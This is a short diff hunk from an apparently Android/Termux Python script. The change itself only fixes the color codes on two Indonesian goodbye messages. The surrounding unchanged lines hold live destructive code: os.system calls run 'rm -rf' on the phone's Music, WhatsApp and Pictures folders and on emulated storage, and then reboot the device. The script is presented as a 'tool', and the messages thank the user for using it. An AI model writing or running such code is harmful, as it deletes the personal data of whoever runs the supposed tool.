@@ -115,8 +115,8 @@ os.system('rm -rf /storage/emulated/0/Music')
 os.system('rm -rf /storage/emulated/0/WhatsApp')
 os.system('rm -rf /storage/emulated/0/Pictures')
 os.system('rm -rf /strorage/emulated/')
-print("033[1;35m Terima kasih sudah menggunakan tools ini")
-print(033[1;35m shilakan kembali lagi nanti")
+print("\033[1;35m Terima kasih sudah menggunakan tools ini")
+print("\033[1;35m shilakan kembali lagi nanti")
 os.system("reboot")
 
 
